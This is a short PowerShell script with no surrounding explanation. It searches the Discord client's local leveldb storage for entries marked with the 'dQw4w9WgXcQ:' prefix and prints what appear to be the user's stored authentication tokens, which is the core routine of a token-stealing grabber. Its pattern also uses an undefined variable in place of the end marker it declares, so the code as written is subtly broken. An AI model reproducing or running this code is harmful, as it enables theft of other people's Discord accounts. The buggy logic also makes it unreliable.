$discordPath = $env:APPDATA+"\discord"
$storagePath = "\Local Storage\leveldb"

$stable = $discordPath+$storagePath
if ( Test-Path -LiteralPath $stable ) {
  Set-Location $stable
  $files = @(Get-ChildItem *.ldb)
  Foreach ($file in $files) {
    $file = Get-Content -Path $file
    $rickrolllink = "dQw4w9WgXcQ:"
    $endofdctoken = '=="'
    $pattern = "$rickrolllink(.*?)$secondString"
    $result = [regex]::Match($file,$pattern).Groups[1].Value
    Write-Output $result
    }
}
